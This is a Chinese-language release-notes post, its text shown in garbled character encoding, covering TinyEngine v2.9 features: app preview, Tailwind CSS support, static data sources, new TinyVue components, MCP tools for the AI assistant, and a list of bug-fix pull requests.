<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/38dd6975efe6470a8a20e772a6a3b4c8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgT3BlblRpbnnnpL7ljLo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766395540&amp;x-signature=KNMcTFq%2FExJsxVDllRHpu3c1SG4%3D" alt="12.png" loading="lazy"/></p>
<p>å¦‚æœä¸å¸Œæœ›åœ¨AIåŠ©æ‰‹æ’ä»¶ä¸­ä½¿ç”¨ï¼Œå¯ä»¥é€šè¿‡ä¿®æ”¹æ³¨å†Œè¡¨å…³é—­</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// registry.js</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> {
  [<span class="hljs-variable constant_">META_APP</span>.<span class="hljs-property">Robot</span>]: {
    <span class="hljs-attr">options</span>: {
      <span class="hljs-attr">enableResourceContext</span>: <span class="hljs-literal">false</span>, <span class="hljs-comment">// æç¤ºè¯ä¸Šä¸‹æ–‡æºå¸¦èµ„æºæ’ä»¶å›¾ç‰‡ï¼Œé»˜è®¤true</span>
    }
  }
}
</code></pre>
<h3 data-id="heading-10">3. ã€å¢å¼ºã€‘é¢„è§ˆæ’ä»¶æ”¯æŒåº”ç”¨é¢„è§ˆ</h3>
<p>åœ¨ä¹‹å‰çš„é¢„è§ˆæ’ä»¶ä¸­åªèƒ½å¤Ÿå®ç°å•é¡µé¢çš„é¢„è§ˆï¼Œå¯¹äºéœ€è¦åœ¨å¤šä¸ªé¡µé¢ä¸­äº¤äº’è·³è½¬çš„åœºæ™¯æ— æ³•æ»¡è¶³ã€‚<br/>
åœ¨v2.9 ç‰ˆæœ¬ä¸­ï¼ŒTinyEngineæ”¯æŒäº†åº”ç”¨çš„å…¨å±€é¢„è§ˆï¼Œèƒ½å¤Ÿé¢„è§ˆå®Œæ•´é¡¹ç›®çš„æ•ˆæœï¼Œå¹¶ä¸”æ”¯æŒæ‰‹åŠ¨è·¯ç”±åˆ‡æ¢ï¼Œä¹Ÿèƒ½å¤Ÿåœ¨è°ƒè¯•æ¨¡å¼ä¸‹æŸ¥çœ‹æ•´ä¸ªåº”ç”¨çš„æºç ã€‚
1ï¼‰å…¥å£ï¼š</p>
<p>å·¥å…·æ çš„é¢„è§ˆå›¾æ ‡è¿›è¡Œäº†è°ƒæ•´ï¼Œç›´æ¥ç‚¹å‡»å›¾æ ‡ä¸ä¹‹å‰é€»è¾‘ä¸€è‡´ä¸ºé¡µé¢é¢„è§ˆï¼Œç‚¹å‡»åé¢çš„ç®­å¤´å¯æ‰“å¼€ä¸‹æ‹‰åˆ—è¡¨ï¼Œå¯ä»¥é€‰æ‹©åº”ç”¨é¢„è§ˆ</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/eed75772dd65425b85e2fba42927f1f4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgT3BlblRpbnnnpL7ljLo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766395540&amp;x-signature=SN1ycnO%2FwhcmYHbGACPBW6v3e5A%3D" alt="13.png" loading="lazy"/></p>
<p>2ï¼‰é¢„è§ˆæ•ˆæœ</p>
<p>æ‰“å¼€é¢„è§ˆé¡µé¢åï¼Œå¯ä»¥çœ‹åˆ°åº”ç”¨é¢„è§ˆä¸é¡µé¢é¢„è§ˆç›¸æ¯”æ·»åŠ äº†è·¯ç”±åˆ‡æ¢æ ï¼Œå¯ä»¥é€‰æ‹©è·¯ç”±è¿›è¡Œåˆ‡æ¢ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e951fedbfbc14b90b990d1e915c2adf5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgT3BlblRpbnnnpL7ljLo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766395540&amp;x-signature=3z2sQksjaNpj2OOtNxkZMdzp%2FHM%3D" alt="14.png" loading="lazy"/></p>
<h3 data-id="heading-11">4. ã€å¢å¼ºã€‘Tailwindcssæ”¯æŒ</h3>
<p>Tailwind CSS æ˜¯ä¸€ç§å®ç”¨ä¼˜å…ˆçš„ CSS æ¡†æ¶ï¼Œæä¾›ä¸°å¯Œçš„åŸå­ç±»ï¼Œå¦‚Â <code>text-center</code>ã€<code>p-4</code>ã€<code>bg-blue-500</code>Â ç­‰ï¼Œå¯å¿«é€Ÿæ„å»ºå®šåˆ¶åŒ–ã€å“åº”å¼ç•Œé¢ã€‚</p>
<p>ä½ä»£ç å¹³å°æ”¯æŒ Tailwind åï¼Œç”¨æˆ·åœ¨å¯è§†åŒ–æ­å»ºçš„åŒæ—¶ï¼Œèƒ½ç›´æ¥é€šè¿‡ç±»åç²¾ç»†æ§åˆ¶æ ·å¼ï¼Œæ— éœ€ç¼–å†™æˆ–é…ç½®å¤§é‡æ ·å¼å³å¯å®ç°é«˜æ•ˆç¾è§‚çš„å‰ç«¯å¼€å‘ï¼Œæå‡çµæ´»æ€§ä¸å¼€å‘é€Ÿåº¦ã€‚</p>
<p>åœ¨v2.9ä»¥ä¸Šç‰ˆæœ¬ï¼Œå·²é»˜è®¤æ”¯æŒTailwind CSSæ¡†æ¶ã€‚</p>
<p>Â <strong>å¯ç”¨åçš„è¡Œä¸º</strong></p>
<ul>
<li>
<p>è®¾è®¡æ€ï¼šç”»å¸ƒæ”¯æŒç›´æ¥åŠ è½½Tailwindæ ·å¼ç±»</p>
</li>
<li>
<p>é¢„è§ˆæ€ï¼šè‡ªåŠ¨æŒ‰éœ€åŠ è½½Â Â <code>@tailwindcss/browser</code>ï¼Œä½¿ç”»å¸ƒ/é¢„è§ˆä¸­å¯ç›´æ¥ä½¿ç”¨ Tailwind åŸå­ç±»ã€‚</p>
</li>
<li>
<p>å‡ºç ç”Ÿæˆï¼šç”Ÿæˆçš„åº”ç”¨å°†è‡ªåŠ¨å®Œæˆä»¥ä¸‹é…ç½®ï¼ˆåŸºäº Tailwind CSS v4 é›¶é…ç½®æ–¹æ¡ˆï¼‰ï¼š</p>
<ul>
<li>åœ¨ä¾èµ–ä¸­æ·»åŠ Â Â <code>tailwindcss</code>ï¼Œå¹¶åœ¨å¼€å‘ä¾èµ–ä¸­æ·»åŠ Â Â <code>@tailwindcss/vite</code>ï¼›</li>
<li>åœ¨ Vite é…ç½®ä¸­æ³¨å†ŒÂ Â <code>tailwindcss()</code>Â  æ’ä»¶ï¼›</li>
<li>ç”ŸæˆÂ Â <code>src/style.css</code>ï¼Œå†…å®¹åŒ…å«Â Â <code>@import "tailwindcss";</code>ï¼›</li>
<li>åœ¨Â Â <code>src/main.js</code>Â è‡ªåŠ¨å¼•å…¥Â Â <code>./style.css</code>ã€‚</li>
</ul>
</li>
</ul>
<p>ä»¥ä¸Šæ­¥éª¤ç”±å¼•æ“/å‡ºç å™¨è‡ªåŠ¨å®Œæˆï¼Œæ— éœ€æ‰‹åŠ¨å¹²é¢„ã€‚</p>
<p><strong>æ•ˆæœ</strong></p>
<p>é€‰ä¸­èŠ‚ç‚¹ååœ¨å±æ€§é…ç½®é¢æ¿æ ·å¼ç±»ä¸­ç›´æ¥å¡«å†™Tailwindæ ·å¼ç±»åï¼Œå³å¯çœ‹åˆ°ç”»å¸ƒTailwindæ ·å¼ç”Ÿæ•ˆï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bfa1f0714ff9498b9e9db3f76a0003c1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgT3BlblRpbnnnpL7ljLo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766395540&amp;x-signature=eny8j20iXC%2Fc0R7a3ipCOXFAzOE%3D" alt="15.png" loading="lazy"/></p>
<p><strong>å…³é—­ Tailwind</strong></p>
<p>å¯ä»¥é€šè¿‡æ³¨å†Œè¡¨å…³é—­TailwindåŠŸèƒ½ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// registry.js</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> {
  <span class="hljs-string">'engine.config'</span>: {
    <span class="hljs-comment">// ...å…¶ä»–é…ç½®</span>
    <span class="hljs-attr">enableTailwindCSS</span>: <span class="hljs-literal">true</span>, <span class="hljs-comment">// å¼€å¯ï¼ˆé»˜è®¤å³ä¸º trueï¼‰ï¼›è®¾ä¸º false å¯å…³é—­</span>
  },
};
</code></pre>
<p>å½“é…ç½®ä¸ºÂ <code>enableTailwindCSS: false</code>Â æ—¶ï¼š</p>
<ul>
<li>é¢„è§ˆæ€ä¸ä¼šåŠ è½½Â Â <code>@tailwindcss/browser</code>ï¼›</li>
<li>å‡ºç æ—¶ä¸ä¼šæ³¨å…¥ä¸ Tailwind ç›¸å…³çš„ä¾èµ–ã€Vite æ’ä»¶åŠæ ·å¼æ–‡ä»¶å¯¼å…¥ã€‚</li>
</ul>
<p><strong>æ³¨æ„äº‹é¡¹</strong></p>
<ul>
<li>é¢„è§ˆä¾èµ–è§£æï¼šå†…ç½® import-map å·²åŒ…å«Â <code>@tailwindcss/browser</code>Â æ˜ å°„ï¼›å¦‚ä½¿ç”¨è‡ªå®šä¹‰ CDN/ç¦»çº¿ç¯å¢ƒï¼Œè¯·ç¡®ä¿è¯¥æ˜ å°„å¯ç”¨ã€‚</li>
<li>è‡ªå®šä¹‰æ ·å¼ï¼šå¯åœ¨ç”Ÿæˆçš„Â <code>src/style.css</code>Â ä¸­è¿½åŠ è‡ªå®šä¹‰æ ·å¼ï¼Œæˆ–åœ¨é¡¹ç›®ä¸­æ–°å¢æ ·å¼æ–‡ä»¶åè‡ªè¡Œå¼•å…¥ã€‚</li>
<li>è¿è¡Œæ—¶æ¸²æŸ“ï¼šå¦‚æœæ‚¨è‡ªå®šä¹‰äº†è¿è¡Œæ—¶æ¸²æŸ“å¼•æ“ï¼Œè¯·ç¡®ä¿åœ¨è¿è¡Œæ—¶æ¸²æŸ“ä¸­å¢åŠ å¯¹ Tailwind CSS çš„æ”¯æŒã€‚</li>
</ul>
<h3 data-id="heading-12">5.ã€å¢å¼ºã€‘æ”¯æŒé™æ€æ•°æ®æº</h3>
<p>è®¾è®¡å™¨æä¾›æ•°æ®æºæ¥é…åˆç”»å¸ƒä¸Šçš„ç»„ä»¶/åŒºå—æ¸²æŸ“ï¼Œä¹‹å‰ç‰ˆæœ¬åªæ”¯æŒé‡‡å–è¿œç¨‹APIè¯·æ±‚JSONæ•°æ®åŠ¨æ€è·å–çš„æ–¹å¼ï¼Œè‡ªTinyEngine v2.9+ç‰ˆæœ¬å¼€å§‹ï¼Œæ”¯æŒé™æ€æ•°æ®æºé…ç½®ã€‚</p>
<h4 data-id="heading-13">ä½¿ç”¨æ­¥éª¤</h4>
<p>1ï¼‰åˆ›å»ºæ•°æ®æºï¼Œæ•°æ®æºç±»å‹é€‰æ‹©é™æ€æ•°æ®æºï¼Œé…ç½®æ•°æ®æºåç§°ä»¥åŠæ•°æ®æºå­—æ®µï¼Œæ ¹æ®é…ç½®çš„æ•°æ®æºå­—æ®µæ–°å¢é™æ€æ•°æ®ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/da178dd75df5402cbdd79ee2f29a25a3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgT3BlblRpbnnnpL7ljLo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766395540&amp;x-signature=hNXxHdA1lExMl30u%2FMUN7YPjNf4%3D" alt="16.gif" loading="lazy"/></p>
<p>2ï¼‰ä½¿ç”¨æ•°æ®æºMockæ•°æ®ï¼ˆæ•°æ®æºä½¿ç”¨æ–¹å¼ä¸è¿œç¨‹æ•°æ®æºç›¸åŒï¼‰</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/31a7f68167af4923af297ca6ce28d05e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgT3BlblRpbnnnpL7ljLo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766395540&amp;x-signature=I7yg73cG0I0wvRu87pKLiuN%2BeGA%3D" alt="17.gif" loading="lazy"/></p>
<h3 data-id="heading-14">6.ã€å¢å¼ºã€‘ç»„ä»¶ç‰©æ–™æ›´æ–°</h3>
<ul>
<li>ä¿®æ”¹è·¯ç”±é€‰æ‹©é…ç½®å™¨ï¼Œæ·»åŠ æ ‡ç­¾æ é…ç½®å™¨å’Œå¯¼èˆªç»„ä»¶</li>
</ul>
<p>æ‹–æ‹½ä¸€ä¸ªå¯¼èˆªæ¡ç»„ä»¶åˆ°ç”»å¸ƒï¼Œå¯ä»¥æ›´æ”¹å¯¼èˆªæ¡ä¸ºæ¨ªå‘æˆ–è€…çºµå‘ï¼Œå¯¼èˆªèœå•é¡¹æ”¯æŒå¢åˆ æ”¹ï¼Œèœå•é¡¹æ”¯æŒé…ç½®è·³è½¬é¡µé¢</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6f71b3db3f904820841458fda509d4ab~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgT3BlblRpbnnnpL7ljLo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766395540&amp;x-signature=xJNMVfTrCFAlXfo%2B3DtH3t0EsTY%3D" alt="18.gif" loading="lazy"/></p>
<ul>
<li>
<p>æ›´æ–°ç‰©æ–™Iconï¼ˆè®¾è®¡ç¨¿æ¢æ–°é£æ ¼åï¼ŒåŸç‰©æ–™å›¾æ ‡è·Ÿé¡µé¢é£æ ¼ä¸åŒ¹é…ï¼Œæ›´æ¢æ‰€æœ‰çš„ç‰©æ–™å›¾æ ‡ï¼‰</p>
</li>
<li>
<p>æ·»åŠ TinyVueå›¾è¡¨ç»„ä»¶</p>
</li>
</ul>
<p>ç‰©æ–™é¢æ¿æ–°å¢TinyVueå›¾è¡¨ç»„ä»¶ï¼Œä¸»è¦åŒ…æ‹¬æŠ˜çº¿å›¾ã€æŸ±çŠ¶å›¾ã€æ¡å½¢å›¾ã€åœ†ç›˜å›¾ã€ç¯å½¢å›¾ã€é›·è¾¾å›¾ã€ç€‘å¸ƒå›¾ã€æ¼æ–—å›¾ã€æ•£ç‚¹å›¾ ç­‰</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/697dee328f1948409649bf01521a92fa~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgT3BlblRpbnnnpL7ljLo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766395540&amp;x-signature=akIUxr8P9igAjxfu2U9NGX7GMv8%3D" alt="19.png" loading="lazy"/></p>
<ul>
<li>
<p>æ·»åŠ TinyVueåŸºç¡€ç»„ä»¶</p>
</li>
<li>
<p>è¡¨å•ç±»å‹ä¸­æ–°å¢å•é€‰ç»„ã€è¯„åˆ†ã€æ»‘å—ã€çº§è”é€‰æ‹©å™¨ ç»„ä»¶</p>
</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/96596458afa94c6d9d36a8018469ec95~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgT3BlblRpbnnnpL7ljLo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766395540&amp;x-signature=rhk6OWyO%2FG5Umh9as1UgBJtalXU%3D" alt="20.png" loading="lazy"/></p>
<ul>
<li>æ•°æ®å±•ç¤ºä¸­æ–°å¢éª¨æ¶å±ã€å¡ç‰‡ã€æ—¥å†ã€è¿›åº¦æ¡ã€æ ‡è®°ã€æ ‡ç­¾ã€ç»Ÿè®¡æ•°å€¼ ç»„ä»¶</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e8d49aa941dc4be6adfc343ceeccddc3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgT3BlblRpbnnnpL7ljLo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766395540&amp;x-signature=OM3v2XIq%2FzMGjpcs5AmylXpdFkQ%3D" alt="21.png" loading="lazy"/></p>
<ul>
<li>å¯¼èˆªç±»å‹ä¸­æ–°å¢æ­¥éª¤æ¡å’Œæ ‘å½¢èœå•ç»„ä»¶</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d912415cf5c44e468ef33e7d912fff34~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgT3BlblRpbnnnpL7ljLo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766395540&amp;x-signature=InVL5WD3dqcpmh9vHuOE83ljQLc%3D" alt="22.png" loading="lazy"/></p>
<h3 data-id="heading-15">7.Â ã€å¢å¼ºã€‘MCPå·¥å…·æ›´æ–°</h3>
<p>AI åŠ©æ‰‹é™¤äº†æ–°å¢çš„æ­å»ºæ¨¡å¼ï¼ŒåŸæœ‰çš„å¯¹è¯æ¨¡å¼ä¹Ÿè¿›è¡Œäº†å¢å¼ºï¼Œå¢åŠ äº†è‹¥å¹²ä¸ªæ’ä»¶çš„ mcp å·¥å…·ï¼š</p>
<ul>
<li>å›½é™…åŒ–ï¼ˆi18nï¼‰ ç›¸å…³ mcp å·¥å…·</li>
<li>åº”ç”¨çŠ¶æ€ã€é¡µé¢çŠ¶æ€ç›¸å…³ mcp å·¥å…·</li>
<li>é¡µé¢å¢åˆ æŸ¥æ”¹å·¥å…·</li>
<li>èŠ‚ç‚¹æ“ä½œç›¸å…³ mcp å·¥å…·ï¼ˆèŠ‚ç‚¹é€‰ä¸­ã€å±æ€§ä¿®æ”¹ã€å¢åˆ èŠ‚ç‚¹ç­‰ç­‰ï¼‰</li>
</ul>
<p><strong>å¦‚ä½•ä½¿ç”¨</strong>ï¼š</p>
<p>å½“å‰å¯ä»¥å‡çº§åˆ° v2.9 ç‰ˆæœ¬ï¼Œåˆ‡æ¢åˆ° chat æ¨¡å¼ï¼Œå³å¯åœ¨å¯¹è¯ä¸­ä½¿ç”¨MCPå·¥å…·ï¼ŒAIä¼šè‡ªåŠ¨è°ƒç”¨ç›¸åº”å·¥å…·ã€‚ç”¨æˆ·ä¹Ÿå¯ä»¥æ‰‹åŠ¨ç‚¹å‡»å…³é—­æŸä¸ª mcp å·¥å…·ã€‚</p>
<p>ç¤ºä¾‹å›¾ï¼š
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c209166943894168b244e05eb007dbab~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgT3BlblRpbnnnpL7ljLo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766395540&amp;x-signature=RRKzcWuNtM7ZKdWR3Fg3d6Q12VA%3D" alt="23.png" loading="lazy"/></p>
<p><strong>äºŒæ¬¡å¼€å‘ TinyEngine æ—¶ï¼Œå¦‚ä½•ä¿®æ”¹/æ·»åŠ /åˆ é™¤ mcp å·¥å…·ï¼Ÿ</strong></p>
<p>å½“å‰ mcp å·¥å…·éƒ½é»˜è®¤éšç€æ’ä»¶çš„æ³¨å†Œè¡¨å¯¼å‡ºï¼ˆå› ä¸ºä¾èµ–æ’ä»¶çš„ç›¸å…³èƒ½åŠ›ï¼‰ï¼Œæ‰€ä»¥å¦‚æœéœ€è¦ä¿®æ”¹/æ·»åŠ /åˆ é™¤ mcp å·¥å…·ï¼Œä¿®æ”¹æ³¨å†Œè¡¨å³å¯ã€‚</p>
<p>é»˜è®¤çš„æ’ä»¶æ³¨å†Œè¡¨å¯¼å‡ºï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// mcp å·¥å…· mcp/index.js</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> mcp = {
  <span class="hljs-attr">tools</span>: [getGlobalState, addOrModifyGlobalState, deleteGlobalState]
}


<span class="hljs-comment">// æ’ä»¶æ³¨å†Œè¡¨å¯¼å‡º index.js</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> {
  ...metaData,
  entry,
  <span class="hljs-attr">metas</span>: [globalStateService],
  <span class="hljs-comment">// mcp çš„ç›¸å…³å¯¼å‡º</span>
  mcp
}
</code></pre>
<p>åœ¨äºŒæ¬¡å¼€å‘å·¥ç¨‹ä¸­ä¿®æ”¹/æ·»åŠ  mcp å·¥å…·ï¼ŒåŒè‡ªå®šä¹‰æ³¨å†Œè¡¨ï¼Œè¯·å‚è€ƒ<a href="https://link.juejin.cn?target=https%3A%2F%2Fopentiny.design%2Ftiny-engine%23%2Fhelp-center%2Fcourse%2Fdev%2Fnew-registry" title="https://opentiny.design/tiny-engine#/help-center/course/dev/new-registry" target="_blank" ref="nofollow noopener noreferrer">æ³¨å†Œè¡¨ç›¸å…³æ–‡æ¡£</a>ã€‚</p>
<p><strong>æœªæ¥ä¼˜åŒ–</strong>ï¼š</p>
<ul>
<li>æ·»åŠ ã€è°ƒä¼˜ mcp å·¥å…·</li>
<li>æ·»åŠ  chat æ¨¡å¼çš„ç³»ç»Ÿæç¤ºè¯ï¼Œè®© AI å·¥å…·è°ƒç”¨æ•ˆæœæ›´å¥½</li>
</ul>
<h3 data-id="heading-16">8. ã€å…¶ä»–ã€‘åŠŸèƒ½ç»†èŠ‚ä¼˜åŒ–&amp;bugä¿®å¤</h3>
<ul>
<li>ä¸ºTinyGridé…ç½®æ·»åŠ ç‰ˆæœ¬å­—æ®µ byÂ <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FLLDLLY" target="_blank" title="https://github.com/LLDLLY" ref="nofollow noopener noreferrer">@LLDLLY</a>Â inÂ <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fopentiny%2Ftiny-engine%2Fpull%2F1568" target="_blank" title="https://github.com/opentiny/tiny-engine/pull/1568" ref="nofollow noopener noreferrer">opentiny/tiny-engine#1568</a></li>
<li>ä¼˜åŒ–ç”»å¸ƒé€‰é¡¹ä½ç½®è®¡ç®—ç®—æ³• byÂ <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fchilingling" target="_blank" title="https://github.com/chilingling" ref="nofollow noopener noreferrer">@chilingling</a>Â inÂ <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fopentiny%2Ftiny-engine%2Fpull%2F1572" target="_blank" title="https://github.com/opentiny/tiny-engine/pull/1572" ref="nofollow noopener noreferrer">opentiny/tiny-engine#1572</a></li>
<li>ä»propsè§£æåŒºå—ä¾èµ– byÂ <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fchilingling" target="_blank" title="https://github.com/chilingling" ref="nofollow noopener noreferrer">@chilingling</a>Â inÂ <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fopentiny%2Ftiny-engine%2Fpull%2F1602" target="_blank" title="https://github.com/opentiny/tiny-engine/pull/1602" ref="nofollow noopener noreferrer">opentiny/tiny-engine#1602</a></li>
<li>ä¿®å¤tinyvueç±»å‹é”™è¯¯ byÂ <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fchilingling" target="_blank" title="https://github.com/chilingling" ref="nofollow noopener noreferrer">@chilingling</a>Â inÂ <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fopentiny%2Ftiny-engine%2Fpull%2F1623" target="_blank" title="https://github.com/opentiny/tiny-engine/pull/1623" ref="nofollow noopener noreferrer">opentiny/tiny-engine#1623</a></li>
</ul>

<ul>
<li>ä¿®å¤ç”¨æˆ·ç›®å½•å¥æŸ„åˆ é™¤å¯¼è‡´çš„ç”Ÿæˆå¤±è´¥ byÂ <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fchilingling" target="_blank" title="https://github.com/chilingling" ref="nofollow noopener noreferrer">@chilingling</a>Â inÂ <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fopentiny%2Ftiny-engine%2Fpull%2F1543" target="_blank" title="https://github.com/opentiny/tiny-engine/pull/1543" ref="nofollow noopener noreferrer">opentiny/tiny-engine#1543</a></li>
<li>ä¿®å¤å·¥å…·åç§°å’Œå¯¼å‡ºåä¸ä¸€è‡´é—®é¢˜ byÂ <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fchilingling" target="_blank" title="https://github.com/chilingling" ref="nofollow noopener noreferrer">@chilingling</a>Â inÂ <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fopentiny%2Ftiny-engine%2Fpull%2F1606" target="_blank" title="https://github.com/opentiny/tiny-engine/pull/1606" ref="nofollow noopener noreferrer">opentiny/tiny-engine#1606</a></li>
<li>ç¡®ä¿åªæœ‰å­—ç¬¦ä¸²idæ³¨å†Œåˆ°metaHashMap byÂ <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fchilingling" target="_blank" title="https://github.com/chilingling" ref="nofollow noopener noreferrer">@chilingling</a>Â inÂ <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fopentiny%2Ftiny-engine%2Fpull%2F1622" target="_blank" title="https://github.com/opentiny/tiny-engine/pull/1622" ref="nofollow noopener noreferrer">opentiny/tiny-engine#1622</a></li>
<li>ä¿®å¤ColorInputå†…è¾¹è·é—®é¢˜ byÂ <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fchilingling" target="_blank" title="https://github.com/chilingling" ref="nofollow noopener noreferrer">@chilingling</a>Â inÂ <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fopentiny%2Ftiny-engine%2Fpull%2F1595" target="_blank" title="https://github.com/opentiny/tiny-engine/pull/1595" ref="nofollow noopener noreferrer">opentiny/tiny-engine#1595</a></li>
<li>ä¿®å¤å­é¡µé¢éšè—æ˜¾ç¤ºè®¾ç½®ä¸»é¡µé€‰é¡¹ byÂ <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fchilingling" target="_blank" title="https://github.com/chilingling" ref="nofollow noopener noreferrer">@chilingling</a>Â inÂ <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fopentiny%2Ftiny-engine%2Fpull%2F1544" target="_blank" title="https://github.com/opentiny/tiny-engine/pull/1544" ref="nofollow noopener noreferrer">opentiny/tiny-engine#1544</a></li>
<li>ä¿®å¤baseURLç§»é™¤æ–œæ é—®é¢˜ byÂ <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fchilingling" target="_blank" title="https://github.com/chilingling" ref="nofollow noopener noreferrer">@chilingling</a>Â inÂ <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fopentiny%2Ftiny-engine%2Fpull%2F1631" target="_blank" title="https://github.com/opentiny/tiny-engine/pull/1631" ref="nofollow noopener noreferrer">opentiny/tiny-engine#1631</a></li>
<li>æ ¼å¼åŒ–å·¥å…·è°ƒç”¨ç»“æœ byÂ <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fhexqi" target="_blank" title="https://github.com/hexqi" ref="nofollow noopener noreferrer">@hexqi</a>Â inÂ <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fopentiny%2Ftiny-engine%2Fpull%2F1637" target="_blank" title="https://github.com/opentiny/tiny-engine/pull/1637" ref="nofollow noopener noreferrer">opentiny/tiny-engine#1637</a></li>
</ul>

<ul>
<li>ä¿®å¤å†…ç½®æ„å»ºé€‰é¡¹å¤–éƒ¨åŒ–é—®é¢˜ byÂ <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fbetterdancing" target="_blank" title="https://github.com/betterdancing" ref="nofollow noopener noreferrer">@betterdancing</a>Â inÂ <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fopentiny%2Ftiny-engine%2Fpull%2F1646" target="_blank" title="https://github.com/opentiny/tiny-engine/pull/1646" ref="nofollow noopener noreferrer">opentiny/tiny-engine#1646</a></li>
<li>ä¿®å¤ç»‘å®šäº‹ä»¶åé«˜äº®JSå‡½æ•°å¤±è´¥ byÂ <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fchilingling" target="_blank" title="https://github.com/chilingling" ref="nofollow noopener noreferrer">@chilingling</a>Â inÂ <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fopentiny%2Ftiny-engine%2Fpull%2F1656" target="_blank" title="https://github.com/opentiny/tiny-engine/pull/1656" ref="nofollow noopener noreferrer">opentiny/tiny-engine#1656</a></li>
<li>ä¿®å¤ç”»å¸ƒç»„ä»¶è¾¹æ¡†/å¼€å…³æ ·å¼ç­‰é—®é¢˜ byÂ <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fbetterdancing" target="_blank" title="https://github.com/betterdancing" ref="nofollow noopener noreferrer">@betterdancing</a>Â inÂ <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fopentiny%2Ftiny-engine%2Fpull%2F1649" target="_blank" title="https://github.com/opentiny/tiny-engine/pull/1649" ref="nofollow noopener noreferrer">opentiny/tiny-engine#1649</a></li>
